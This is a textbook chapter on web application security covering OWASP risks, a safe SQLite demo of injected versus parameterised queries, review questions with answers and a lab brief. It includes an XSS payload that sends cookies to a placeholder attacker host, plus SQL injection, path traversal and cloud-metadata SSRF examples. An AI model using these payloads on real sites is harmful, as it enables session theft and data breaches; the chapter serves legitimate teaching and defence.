# Chapter 10: Web Application Security

> "The web is the largest attack surface in history, and every website is a potential entry point."

---

## Learning Objectives

After completing this chapter, you will be able to:

1. Explain the OWASP Top 10 vulnerability categories and the risk each represents.
2. Identify and exploit SQL injection, XSS, and CSRF in a controlled lab environment.
3. Explain broken authentication, insecure direct object references, and security misconfigurations.
4. Describe how HTTPS, CSP, HSTS, and SameSite cookies mitigate web attacks.
5. Test for injection vulnerabilities using manual and automated techniques.
6. Explain server-side request forgery (SSRF) and its impact in cloud environments.
7. Describe the role of a Web Application Firewall and its limitations.
8. Apply secure coding principles to prevent injection, XSS, and broken auth.

## Key Terms

- **OWASP**: Open Web Application Security Project; produces the Top 10 vulnerability list.
- **SQL injection (SQLi)**: injecting SQL code via user input to manipulate a database query.
- **XSS**: Cross-Site Scripting; injecting malicious JavaScript into a page viewed by other users.
- **CSRF**: Cross-Site Request Forgery; tricking a browser into sending an authenticated request.
- **SSRF**: Server-Side Request Forgery; tricking a server into making requests on the attacker's behalf.
- **IDOR**: Insecure Direct Object Reference; accessing another user's data by changing a reference.
- **Broken auth**: failures in session management, credential storage, or MFA enforcement.
- **CSP**: Content Security Policy; HTTP header restricting sources of executable content.
- **HSTS**: HTTP Strict Transport Security; forces HTTPS-only connections.
- **WAF**: Web Application Firewall; filters malicious HTTP requests.
- **Prepared statement**: a parameterised query that separates data from SQL structure.
- **Same-origin policy**: browser policy restricting how documents from one origin access another.

---

## The OWASP Top 10

The OWASP Top 10 {cite}`owasp_top10_2021` is the most widely cited reference for web application
security risk. The 2021 edition groups vulnerabilities into risk categories based on incidence,
exploitability, and impact. This chapter covers the most technically significant categories.

### Broken Access Control

Broken access control is the top risk in OWASP 2021, reflecting how frequently authorisation is
implemented incorrectly. The application authenticates the user but fails to verify whether that
user is authorised to perform a specific action or access a specific resource.

#### Insecure Direct Object References

IDOR occurs when a resource identifier in a URL or parameter can be modified to access another
user's data without authorisation. If `GET /invoice?id=1234` returns a user's invoice, changing
the parameter to `id=1235` should not return another user's invoice without verifying ownership.
Horizontal privilege escalation (accessing peer data) is the most common form; vertical privilege
escalation (accessing admin data) is the most severe.

#### Forced Browsing and Path Traversal

Forced browsing accesses pages or resources that are not linked from the application but are not
protected by access controls. Path traversal (`../../etc/passwd`) exploits insufficient sanitisation
of file-path inputs to read arbitrary files on the server. A well-structured application uses
canonical path validation and whitelists permitted directories.

---

## Injection Attacks

### SQL Injection in Depth

SQLi is caused by constructing SQL queries using string concatenation with user-supplied input.
The canonical fix is parameterised queries (prepared statements), which separate the SQL structure
from the data and make injection structurally impossible.

#### Error-Based SQLi

Error-based SQLi submits syntax that causes the database to return an error message containing
internal information (table names, column names, version strings). Many production applications
display database errors to users, providing free intelligence to attackers.

#### Union-Based SQLi

A UNION SELECT appended to the original query extracts data from other tables. The attacker first
determines the number of columns in the original query (by incrementing ORDER BY N until an error
occurs), then constructs a UNION SELECT with matching column count to extract target data.

#### Blind SQLi

Blind SQLi extracts data one bit at a time when the application provides no direct output. Boolean
blind: `AND 1=1 vs AND 1=2` produces different application responses, allowing inference. Time-based
blind: `AND SLEEP(5)` causes a five-second delay if the condition is true, extractable even when
the application shows identical pages for true and false.

### Cross-Site Scripting

XSS injects malicious JavaScript into content served to other users' browsers.

#### Reflected XSS

Reflected XSS occurs when user input is immediately echoed in the response without encoding. The
attacker crafts a URL containing a payload (`<script>document.location='https://evil/?' +
document.cookie</script>`) and sends it to a victim. The victim's browser executes the script in
the context of the trusted site, stealing the session cookie.

#### Stored XSS

Stored XSS persists the payload in the application's database (a comment, a username, a profile
field). Every user who views the infected page executes the script. Stored XSS is more dangerous
because it does not require the attacker to send a crafted link; the payload runs automatically.

#### DOM-Based XSS

DOM-based XSS occurs when client-side JavaScript writes attacker-controlled data to the DOM without
sanitisation. The payload never reaches the server; it is injected and executed entirely in the
browser. Classic sink functions: `innerHTML`, `eval()`, `document.write()`.

### Cross-Site Request Forgery

CSRF tricks an authenticated user's browser into sending a forged request to a target application.
Because the browser automatically includes session cookies, the forged request appears legitimate.
A hidden form on a malicious page that submits `POST /transfer?amount=1000&to=attacker` to the
banking site executes if the user is logged in and has no CSRF protection.

#### CSRF Mitigations

The primary mitigation is a synchroniser token: a secret value included in each form that the
server validates before processing the request. The SameSite cookie attribute (Strict or Lax)
prevents cookies from being sent with cross-origin requests, defeating CSRF for modern browsers.

### Server-Side Request Forgery

SSRF causes the server to make HTTP requests on behalf of the attacker. If an application fetches
a user-specified URL, an attacker can point it at `http://169.254.169.254/` (the AWS Instance
Metadata Service) to extract IAM credentials, or at internal services (`http://localhost:8080/admin`)
not accessible externally. SSRF is particularly severe in cloud environments where the metadata
service exposes credentials for the host machine's IAM role.

---

## Authentication and Session Management

### Broken Authentication

Broken authentication encompasses: weak password policies, missing lockout after failed login
attempts (enabling brute force), credential stuffing (automating breach-database credentials
against the target), password reset flows that can be bypassed, and session tokens that are
too short or predictable.

#### Secure Password Storage

Passwords must never be stored in plaintext or as simple hashes. Use an adaptive algorithm
(bcrypt, Argon2id) with a sufficient cost factor. The National Institute of Standards and
Technology SP 800-63B recommends Argon2id as the preferred algorithm for new systems.

#### Session Management Best Practices

Session tokens must be generated with a cryptographically secure random number generator (CSPRNG),
be at least 128 bits of entropy, be invalidated on logout, have an absolute timeout, and be
transmitted only over HTTPS. The HttpOnly attribute prevents JavaScript access to session cookies;
the Secure attribute ensures they are sent only over TLS.

---

## Security Misconfigurations

Security misconfiguration is the fifth-ranked OWASP risk and is extremely common. Examples:
default credentials left on administrative interfaces, unnecessary features enabled (debug mode,
unnecessary HTTP methods), verbose error messages exposing stack traces, directory listing enabled,
missing security headers (CSP, HSTS, X-Frame-Options).

### Security Headers

| Header | Purpose |
|---|---|
| Content-Security-Policy | Restrict sources of scripts, styles, and media |
| Strict-Transport-Security | Force HTTPS for the defined period |
| X-Frame-Options | Prevent clickjacking via iframe |
| X-Content-Type-Options: nosniff | Prevent MIME-type sniffing |
| Referrer-Policy | Control referrer header on cross-origin requests |
| Permissions-Policy | Restrict browser features (camera, mic, geolocation) |

---

## Web Application Firewalls and Their Limits

A WAF inspects HTTP requests and blocks or logs those matching malicious patterns. It provides
a useful additional layer against known attack signatures and automated scanners, and can virtually
patch a vulnerable application while a permanent fix is being developed.

### WAF Bypass Techniques

WAFs can be bypassed via encoding tricks (double URL-encoding, Unicode variants), HTTP request
smuggling, case variation, and payload fragments that individually pass rules but combine to an
attack. A WAF is not a substitute for secure code; it is a compensating control for vulnerabilities
that cannot be immediately remediated.

---

## Why This Matters

Web applications are the primary attack surface for most organisations: they are internet-facing,
complex, written by many developers over years, and directly handle sensitive data. The OWASP Top 10
risks are found in the majority of applications tested; they are not rare edge cases. A developer
who understands injection, XSS, and broken auth and applies the corresponding fixes as a matter of
routine produces far fewer vulnerabilities than one who relies on scanners to catch what they missed.

---

## News in Focus

SQL injection vulnerabilities in web applications continue to produce major breaches despite being
one of the oldest and best-understood vulnerability classes. Several headline breaches of credit
card processors, retailers, and government agencies in the last decade were attributed to SQLi in
applications that were not using parameterised queries, despite the fix being well-documented since
the late 1990s. The persistence of this vulnerability class reflects the cost of not making secure
coding practices a hiring and review requirement.

---


In [1]:
# Chapter 10 -- Safe SQLi demonstration with SQLite
import sqlite3, re

# ── Safe vs unsafe query comparison ────────────────────────────────────────────
conn = sqlite3.connect(":memory:")
cur = conn.cursor()
cur.executescript(
    "CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, role TEXT);"
    "INSERT INTO users VALUES (1,'alice','admin');"
    "INSERT INTO users VALUES (2,'bob','user');"
    "INSERT INTO users VALUES (3,'carol','user');"
)

def unsafe_login(username):
    # NEVER do this in real code
    query = f"SELECT * FROM users WHERE username = '{username}'"
    try:
        return cur.execute(query).fetchall()
    except Exception as e:
        return [f"DB ERROR: {e}"]

def safe_login(username):
    # Parameterised query: data can NEVER become code
    return cur.execute("SELECT * FROM users WHERE username = ?", (username,)).fetchall()

print("=== Safe vs Unsafe SQL Query Demo ===\n")
tests = [
    ("Normal input",        "alice"),
    ("SQLi bypass attempt", "' OR 1=1 --"),
    ("Union extraction",    "' UNION SELECT id,username,role FROM users --"),
]

for label, payload in tests:
    unsafe_result = unsafe_login(payload)
    safe_result   = safe_login(payload)
    print(f"  Input ({label}): {payload!r}")
    print(f"    Unsafe query returned : {unsafe_result}")
    print(f"    Safe query returned   : {safe_result}")
    print()

conn.close()

# ── XSS output encoding demo ──────────────────────────────────────────────────
import html

xss_payloads = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert('xss')",
]

print("=== XSS Output Encoding Demo ===")
for p in xss_payloads:
    encoded = html.escape(p)
    print(f"  Raw    : {p}")
    print(f"  Encoded: {encoded}\n")


=== Safe vs Unsafe SQL Query Demo ===

  Input (Normal input): 'alice'
    Unsafe query returned : [(1, 'alice', 'admin')]
    Safe query returned   : [(1, 'alice', 'admin')]

  Input (SQLi bypass attempt): "' OR 1=1 --"
    Unsafe query returned : [(1, 'alice', 'admin'), (2, 'bob', 'user'), (3, 'carol', 'user')]
    Safe query returned   : []

  Input (Union extraction): "' UNION SELECT id,username,role FROM users --"
    Unsafe query returned : [(1, 'alice', 'admin'), (2, 'bob', 'user'), (3, 'carol', 'user')]
    Safe query returned   : []

=== XSS Output Encoding Demo ===
  Raw    : <script>alert(1)</script>
  Encoded: &lt;script&gt;alert(1)&lt;/script&gt;

  Raw    : "><img src=x onerror=alert(1)>
  Encoded: &quot;&gt;&lt;img src=x onerror=alert(1)&gt;

  Raw    : javascript:alert('xss')
  Encoded: javascript:alert(&#x27;xss&#x27;)



## Review Questions (MCQ)

**Q1.** The root cause of SQL injection is:
A. Using a database  B. Constructing queries by concatenating user-supplied strings  C. Using HTTP  D. Missing HTTPS

**Q2.** A parameterised query prevents SQLi because:
A. It encrypts the query  B. Data is sent separately from query structure and cannot become SQL code  C. It validates input length  D. It uses a stored procedure

**Q3.** Stored XSS is more dangerous than reflected XSS because:
A. It affects more browsers  B. It persists in the database and executes for every victim who views the page  C. It is harder to detect  D. It bypasses TLS

**Q4.** CSRF is mitigated by the SameSite=Strict cookie attribute because:
A. Cookies are encrypted  B. Cookies are not sent with cross-origin requests  C. The cookie expires immediately  D. The cookie is HttpOnly

**Q5.** SSRF in a cloud environment is particularly severe because:
A. It bypasses firewalls  B. The Instance Metadata Service exposes IAM credentials  C. It causes DDoS  D. It breaks TLS

**Q6.** IDOR vulnerabilities are in the OWASP category:
A. Cryptographic Failures  B. Broken Access Control  C. Injection  D. Security Misconfiguration

**Q7.** The Content-Security-Policy header primarily mitigates:
A. SQL injection  B. CSRF  C. XSS by restricting executable content sources  D. Session fixation

**Q8.** The HSTS header forces:
A. HTTP-only connections  B. HTTPS-only connections for the defined period  C. Encrypted cookies  D. SameSite cookies

**Q9.** A WAF is best described as:
A. A complete replacement for secure code  B. A compensating control that filters known attack patterns  C. A vulnerability scanner  D. An intrusion detection system

**Q10.** DOM-based XSS differs from reflected XSS in that the payload:
A. Requires a database  B. Never touches the server; injected and executed entirely in the browser  C. Is persistent  D. Only works in Internet Explorer

*Answers: Q1 B, Q2 B, Q3 B, Q4 B, Q5 B, Q6 B, Q7 C, Q8 B, Q9 B, Q10 B.*

## Lab Assignment

**Part A -- SQLi**: Using DVWA or SQLi-labs (locally), find and exploit at least two forms of SQL injection (error-based and blind). Document: the vulnerable parameter, the injection payload, the database version and at least one table name extracted.

**Part B -- XSS**: In DVWA, find and demonstrate reflected, stored, and DOM-based XSS. For each, document: the injection point, the payload, and the impact (what could an attacker do with this XSS).

**Part C -- Security headers audit**: Use `curl -I https://<any-public-site>` on three websites you are not targeting maliciously (large companies with public bug bounty programmes). Document which security headers are present and which are missing. Grade each site A-F.

**Part D -- CSRF protection analysis**: Inspect the login and account-update forms of a web application you own or are authorised to test. Identify whether CSRF tokens are present, whether they are validated server-side, and whether SameSite attributes are set on session cookies.

## References

```{bibliography}
:filter: docname in docnames
```


```{index} OWASP, SQL injection, XSS, CSRF, SSRF, IDOR, Broken auth, CSP, HSTS, WAF, Prepared statement, Same-origin policy
```
